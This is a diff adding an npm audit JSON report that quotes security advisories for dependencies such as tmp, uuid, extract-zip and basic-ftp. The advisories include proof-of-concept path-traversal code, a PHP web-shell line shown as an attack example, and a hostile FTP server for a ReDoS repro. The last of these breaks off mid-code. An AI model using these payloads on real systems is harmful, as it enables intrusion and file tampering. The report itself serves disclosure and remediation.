@@ -1,0 +1,503 @@
+{
+ "actions": [
+  {
+   "action": "review",
+   "module": "tmp",
+   "resolves": [
+    {
+     "id": 1109537,
+     "path": ".>@lhci/cli>inquirer>external-editor>tmp",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    },
+    {
+     "id": 1109537,
+     "path": ".>@lhci/cli>tmp",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    },
+    {
+     "id": 1120654,
+     "path": ".>@lhci/cli>inquirer>external-editor>tmp",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    },
+    {
+     "id": 1120654,
+     "path": ".>@lhci/cli>tmp",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    }
+   ]
+  },
+  {
+   "action": "review",
+   "module": "uuid",
+   "resolves": [
+    {
+     "id": 1119441,
+     "path": ".>@lhci/cli>uuid",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    }
+   ]
+  },
+  {
+   "action": "review",
+   "module": "extract-zip",
+   "resolves": [
+    {
+     "id": 1139346,
+     "path": ".>@lhci/cli>lighthouse>puppeteer-core>@puppeteer/browsers>extract-zip",
+     "dev": false,
+     "bundled": false,
+     "optional": false
+    },
+    {
+     "id": 1193685,
+     "path": ".>@lhci/cli>lighthouse>puppeteer-core>@puppeteer/browsers>extract-zip",
+     "dev": false,
+     "bundled": false,
+     "optional": false
+    }
+   ]
+  },
+  {
+   "action": "review",
+   "module": "basic-ftp",
+   "resolves": [
+    {
+     "id": 1240853,
+     "path": ".>@lhci/cli>proxy-agent>pac-proxy-agent>get-uri>basic-ftp",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    }
+   ]
+  },
+  {
+   "action": "review",
+   "module": "zod",
+   "resolves": [
+    {
+     "id": 1243066,
+     "path": ".>@lhci/cli>lighthouse>puppeteer-core>chromium-bidi>zod",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    }
+   ]
+  },
+  {
+   "action": "review",
+   "module": "deepmerge",
+   "resolves": [
+    {
+     "id": 1243505,
+     "path": "apps__web>@astrojs/svelte>@sveltejs/vite-plugin-svelte>deepmerge",
+     "dev": false,
+     "bundled": false,
+     "optional": false
+    }
+   ]
+  },
+  {
+   "action": "review",
+   "module": "minimatch",
+   "resolves": [
+    {
+     "id": 1244012,
+     "path": ".>@lhci/cli>chrome-launcher>rimraf>glob>minimatch",
+     "dev": false,
+     "optional": false,
+     "bundled": false
+    }
+   ]
+  }
+ ],
+ "advisories": {
+  "1109537": {
+   "findings": [
+    {
+     "version": "0.0.33",
+     "paths": [
+      ".>@lhci/cli>inquirer>external-editor>tmp"
+     ]
+    },
+    {
+     "version": "0.1.0",
+     "paths": [
+      ".>@lhci/cli>tmp"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
+   "created": "2025-08-06T17:06:04.000Z",
+   "id": 1109537,
+   "npm_advisory_id": null,
+   "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+   "reported_by": null,
+   "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+   "metadata": null,
+   "cves": [
+    "CVE-2025-54798"
+   ],
+   "access": "public",
+   "severity": "low",
+   "module_name": "tmp",
+   "vulnerable_versions": "<=0.2.3",
+   "github_advisory_id": "GHSA-52f5-9888-hmc6",
+   "recommendation": "Upgrade to version 0.2.4 or later",
+   "patched_versions": ">=0.2.4",
+   "updated": "2025-11-03T21:34:21.000Z",
+   "cvss": {
+    "score": 2.5,
+    "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+   },
+   "cwe": [
+    "CWE-59"
+   ],
+   "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
+  },
+  "1119441": {
+   "findings": [
+    {
+     "version": "8.3.2",
+     "paths": [
+      ".>@lhci/cli>uuid"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+   "created": "2026-04-22T20:53:24.000Z",
+   "id": 1119441,
+   "npm_advisory_id": null,
+   "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+   "reported_by": null,
+   "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-41907"
+   ],
+   "access": "public",
+   "severity": "moderate",
+   "module_name": "uuid",
+   "vulnerable_versions": "<11.1.1",
+   "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+   "recommendation": "Upgrade to version 11.1.1 or later",
+   "patched_versions": ">=11.1.1",
+   "updated": "2026-05-21T18:25:57.000Z",
+   "cvss": {
+    "score": 7.5,
+    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+   },
+   "cwe": [
+    "CWE-787",
+    "CWE-1285"
+   ],
+   "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+  },
+  "1120654": {
+   "findings": [
+    {
+     "version": "0.0.33",
+     "paths": [
+      ".>@lhci/cli>inquirer>external-editor>tmp"
+     ]
+    },
+    {
+     "version": "0.1.0",
+     "paths": [
+      ".>@lhci/cli>tmp"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65\n- https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44705\n- https://github.com/advisories/GHSA-ph9p-34f9-6g65",
+   "created": "2026-05-27T00:34:06.000Z",
+   "id": 1120654,
+   "npm_advisory_id": null,
+   "overview": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `<prefix>-<pid>-<random>-<postfix>`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-<pid>-<random>\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) => {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) => {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '<?php system($_GET[\"cmd\"]); ?>');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) => {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) => {\n    if (!err && options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix && options.prefix.includes('..'),\n      options.postfix && options.postfix.includes('..'),  \n      options.dir && path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* && \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
+   "reported_by": null,
+   "title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-44705"
+   ],
+   "access": "public",
+   "severity": "high",
+   "module_name": "tmp",
+   "vulnerable_versions": "<0.2.6",
+   "github_advisory_id": "GHSA-ph9p-34f9-6g65",
+   "recommendation": "Upgrade to version 0.2.6 or later",
+   "patched_versions": ">=0.2.6",
+   "updated": "2026-06-12T19:25:33.000Z",
+   "cvss": {
+    "score": 0,
+    "vectorString": null
+   },
+   "cwe": [
+    "CWE-22"
+   ],
+   "url": "https://github.com/advisories/GHSA-ph9p-34f9-6g65"
+  },
+  "1139346": {
+   "findings": [
+    {
+     "version": "2.0.1",
+     "paths": [
+      ".>@lhci/cli>lighthouse>puppeteer-core>@puppeteer/browsers>extract-zip"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://github.com/ziad626/extract-zip-security-research/security/advisories/GHSA-x7jf-2287-qcpf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-56876\n- https://raw.githubusercontent.com/cisagov/CSAF/develop/csaf_files/IT/white/2026/va-26-177-01.json\n- https://www.cve.org/CVERecord?id=CVE-2026-56876\n- https://github.com/advisories/GHSA-jmr9-qjv8-65gv",
+   "created": "2026-06-26T18:34:00.000Z",
+   "id": 1139346,
+   "npm_advisory_id": null,
+   "overview": "extract-zip does not validate symlink targets when extracting zip archives. When processing a malicious zip file containing a symlink with a relative path like '../../../../etc/passwd', extract-zip will extract the symlink without validation, allowing it to point outside the extraction directory. Depending on how extract-zip is used, an attacker could read or write to arbitrary files.",
+   "reported_by": null,
+   "title": "extract-zip unvalidated symlink path traversal",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-56876"
+   ],
+   "access": "public",
+   "severity": "high",
+   "module_name": "extract-zip",
+   "vulnerable_versions": "<=2.0.1",
+   "github_advisory_id": "GHSA-jmr9-qjv8-65gv",
+   "recommendation": "None",
+   "patched_versions": "<0.0.0",
+   "updated": "2026-08-12T19:22:04.000Z",
+   "cvss": {
+    "score": 8.1,
+    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+   },
+   "cwe": [
+    "CWE-22"
+   ],
+   "url": "https://github.com/advisories/GHSA-jmr9-qjv8-65gv"
+  },
+  "1193685": {
+   "findings": [
+    {
+     "version": "2.0.1",
+     "paths": [
+      ".>@lhci/cli>lighthouse>puppeteer-core>@puppeteer/browsers>extract-zip"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-19693\n- https://github.com/max-mapper/extract-zip\n- https://www.npmjs.com/package/extract-zip\n- https://github.com/max-mapper/extract-zip/pull/160\n- https://github.com/advisories/GHSA-7pqw-9j4j-h8q3",
+   "created": "2026-08-17T15:30:40.000Z",
+   "id": 1193685,
+   "npm_advisory_id": null,
+   "overview": "extract-zip through 2.0.1 containment-checks only the parent directory of each archive entry and never the entry's own final path component, so an archive containing two entries with identical names - a symlink whose target is outside the destination, followed by a regular file - writes through the planted symlink and yields an arbitrary file write outside the destination directory.",
+   "reported_by": null,
+   "title": "extract-zip allows arbitrary file writes through symlink archive entries",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-19693"
+   ],
+   "access": "public",
+   "severity": "high",
+   "module_name": "extract-zip",
+   "vulnerable_versions": "<=2.0.1",
+   "github_advisory_id": "GHSA-7pqw-9j4j-h8q3",
+   "recommendation": "None",
+   "patched_versions": "<0.0.0",
+   "updated": "2026-09-08T20:42:53.000Z",
+   "cvss": {
+    "score": 8.1,
+    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+   },
+   "cwe": [
+    "CWE-22"
+   ],
+   "url": "https://github.com/advisories/GHSA-7pqw-9j4j-h8q3"
+  },
+  "1240853": {
+   "findings": [
+    {
+     "version": "5.3.1",
+     "paths": [
+      ".>@lhci/cli>proxy-agent>pac-proxy-agent>get-uri>basic-ftp"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-c475-qrg2-pj4r\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102990\n- https://github.com/patrickjuchli/basic-ftp/commit/d0d9e07c56e519587bb50532ac6eadbb0cb0cfe9\n- https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.1\n- https://github.com/advisories/GHSA-c475-qrg2-pj4r",
+   "created": "2026-10-01T14:42:42.000Z",
+   "id": 1240853,
+   "npm_advisory_id": null,
+   "overview": "## Summary\n\n`Client.list()` parses the server's directory listing with the Unix-style parser in `parseListUnix.js`. Its `RE_LINE` regex has two adjacent `(\\S+(?:\\s\\S+)*)` groups (owner name, then group name) followed by a required numeric size group. When a line starts with a valid listing prefix but the tokens after it never satisfy the size and date fields, the engine backtracks over every way of splitting those tokens between the two groups before it can fail, so matching one line costs roughly O(n\u00b2) in the line's length.\n\nThe server whose directory a client lists controls that listing, so it can return one line that pins the Node.js event loop for as long as it likes. `parseList()` picks the parser from the last non-blank line only, then runs it on every line, so a normal line placed last selects the Unix parser and a crafted line earlier hits the quadratic match.\n\n## Proof of concept\n\n`npm i basic-ftp && node repro.js`:\n\n```js\nconst net = require(\"net\"), ftp = require(\"basic-ftp\");\nconst KB = Number(process.env.LINE_KB || 128);\nconst payload = \"-rw-r--r-- 1 \" + \"a \".repeat((KB * 1024 - 13) / 2) + \"!\";\nconst listing = payload + \"\\r\\n-rw-r--r-- 1 owner group 42 Jan 1 2020 file.txt\\r\\n\";\nconst server = net.createServer(c => {\n  c.setEncoding(\"latin1\"); c.write(\"220 ok\\r\\n\"); let buf = \"\";\n  c.on(\"data\", d => { buf += d; let i;\n    while ((i = buf.indexOf(\"\\r\\n\")) !== -1) {\n      const cmd = buf.slice(0, i).toUpperCase(); buf = buf.slice(i + 2);\n      if (cmd.startsWith(\"USER\")) c.write(\"331 .\\r\\n\");\n      